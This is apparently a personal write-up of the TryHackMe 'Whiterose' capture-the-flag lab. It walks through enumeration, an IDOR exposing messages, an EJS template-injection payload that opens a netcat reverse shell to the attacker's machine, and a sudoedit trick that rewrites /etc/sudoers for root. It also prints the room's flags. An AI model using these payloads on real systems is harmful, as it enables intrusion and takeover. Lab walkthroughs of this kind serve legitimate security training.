---
title: "TryHackMe Whiterose Writeup"
date: 2025-02-01
categories: [TryHackMe]
tags: [IDOR, CTF, Cybersecurity, TryHackMe, Writeup, Walkthrough]
description: My write up for whiterose room on TryHackMe.
image:
  path: /assets/img/posts/2025-02-01-THM-Whiterose/cover.png
---

# Whiterose - CTF

## Target Information
- **IP Address**: `10.10.49.249`
![alt text](/assets/img/posts/2025-02-01-THM-Whiterose/0.png)
## Credentials
- **Username**: Olivia Cortez
- **Password**: olivi8

---

## Enumeration

### RustScan
**Command:**  
```bash
rustscan -a 10.10.49.249
```
**Results:**
```
Open 10.10.49.249:22
Open 10.10.49.249:80
```

### Nmap
**Command:**  
```bash
nmap -sV -A -p 22,80 10.10.49.249
```
**Results:**
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### FFUF (Fuzzing)
#### Subdirectory Discovery (No Results)
**Command:**
```bash
ffuf -u http://cyprusbank.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

#### Subdomain Discovery (Found `admin`)
**Command:**
```bash
ffuf -u http://cyprusbank.thm/ -H "HOST: FUZZ.cyprusbank.thm" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 1
```

---

## Exploitation

### SQL Injection (Not Working)
Tried:
```sql
Tyrell'
Tyrell' OR 1=1 -- -
```

### URL Manipulation - Message Dumping
Found URL:
```
http://admin.cyprusbank.thm/messages/?c=5
```
By modifying the `c` parameter to `100`, all messages were revealed
![alt text](/assets/img/posts/2025-02-01-THM-Whiterose/1.png) 
including a password for **Gayle Bev**:
```
p~]P@5!6;rs558:q
```

### Login as Gayle Bev
After logging in as **Gayle Bev**, all phone numbers were displayed. Searching for **Tyrell Wellick** revealed his phone number. ![alt text](/assets/img/posts/2025-02-01-THM-Whiterose/2.png)

#### Answer to Question 1:
**Tyrell Wellick's phone number:** `842-029-5701`

### Modifying User Credentials
After logging in as **Gayle Bev**, I was able to modify the customer name and password. Testing with:
```
Name: test
Password: test123
```
An alert displayed the updated credentials.

![alt text](/assets/img/posts/2025-02-01-THM-Whiterose/3.png) 
### BurpSuite Injection
By intercepting requests with BurpSuite, I tested injecting:
```
name='`
```
This caused a **ReferenceError** at:
```
/home/web/app/views/settings.ejs:14
```
![alt text](/assets/img/posts/2025-02-01-THM-Whiterose/4.png) 

Using **EJS Server-Side Template Injection (SSTI)**, I referenced this resource: [EJS, Server side template injection RCE](https://eslam.io/posts/ejs-server-side-template-injection-rce/)


### Reverse Shell Injection
Injected payload:
```bash
name=test&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.4.122.138 1337 -e bash');s
```
After obtaining a shell, I upgraded it with:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Navigating to the `web` directory, I found **user.txt**:
```
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```
#### Answer to Question 2:
**User.txt Flag:** `THM{4lways_upd4te_uR_d3p3nd3nc!3s}`

---

## Privilege Escalation
### Checking Sudo Permissions
Ran:
```bash
sudo -l
```
Found:
```
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm (no password required)
```
Using **Sudoedit Privilege Escalation**, I referenced this resource:
[Sudoedit Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/)

Exploiting using:
```
export EDITOR="vim -- /etc/sudoers"
```
Added:
```
web ALL=(ALL:ALL) NOPASSWD: ALL
```
Saved the file, then ran:
```bash
sudo bash
```
![alt text](/assets/img/posts/2025-02-01-THM-Whiterose/5.png)

Gained **root access** and retrieved **root.txt**:
```
THM{4nd_uR_p4ck4g3s}
```
#### Answer to Question 3:
**Root.txt Flag:** `THM{4nd_uR_p4ck4g3s}`

